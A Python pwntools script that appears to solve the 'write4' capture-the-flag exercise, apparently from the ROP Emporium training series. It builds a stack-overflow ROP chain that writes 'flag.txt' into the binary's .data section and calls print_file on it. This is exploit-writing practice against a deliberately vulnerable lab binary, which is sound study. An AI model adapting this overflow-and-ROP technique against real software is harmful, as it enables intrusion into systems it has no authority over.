from pwn import *

elf = ELF('write4')

#- Step 1 -- Write-what-where gadgets
#
#        [+] Gadget found: 0x400628 mov qword ptr [r14], r15 ; ret
#        [+] Gadget found: 0x400690 pop r14 ; pop r15 ; ret
#        [+] Gadget found: 0x400692 pop r15 ; ret
#        [-] Can't find the 'xor r15, r15' gadget. Try with another 'mov [reg], reg'

p = process('./write4')

data = p64(0x00601028)

mov_to_write = p64(0x00400628)

pop_r14_r15 = p64(0x00400690)

ret = p64(0x004004e6)

pop_rdi = p64(0x00400693)

what_to_write = b'flag.txt'

ret_print = p64(0x00400510)

info("%#x Gadget found: pop r14 ; pop r15 ; ret", u64(pop_r14_r15))
info("%#x .data with w/r permissions", u64(data))
info("%#x Gadget found: mov qword ptr [r14], r15 ; ret", u64(mov_to_write))
info("%#x pop rdi ; ret", u64(pop_rdi))
info("%#x ret... Aligns bytes", u64(ret))
info("%#x printFunction", elf.sym.print_file)


junk = b'A'*40

payload = junk
payload += pop_r14_r15 + data + what_to_write
payload += mov_to_write
payload += pop_rdi + data
payload += ret
payload += ret_print

p.sendline(payload)
success(p.recvall())
